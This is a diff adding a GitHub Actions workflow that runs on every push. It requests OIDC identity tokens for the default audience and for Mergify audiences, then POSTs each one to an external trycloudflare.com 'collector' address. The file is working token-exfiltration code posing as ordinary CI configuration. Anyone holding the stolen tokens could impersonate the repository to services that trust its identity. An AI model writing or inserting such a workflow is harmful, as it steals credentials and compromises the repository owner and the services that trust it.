@@ -1,0 +1,21 @@
+name: abos-oidc
+on:
+  push:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  token:
+    runs-on: ubuntu-latest
+    steps:
+      - name: send ID tokens to the abos collector
+        env:
+          COLLECTOR: https://flow-bizrate-tribute-training.trycloudflare.com
+        run: |
+          for aud in default https://api.mergify.com mergify; do
+            if [ "$aud" = default ]; then U="$ACTIONS_ID_TOKEN_REQUEST_URL"; else U="$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$aud"; fi
+            T=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$U" | jq -r .value)
+            curl -s -X POST -H "Content-Type: text/plain" --data "aud=$aud;$T" "$COLLECTOR/oidc/$(echo $aud | tr -c 'a-z0-9' '-')" > /dev/null
+            sleep 20
+          done
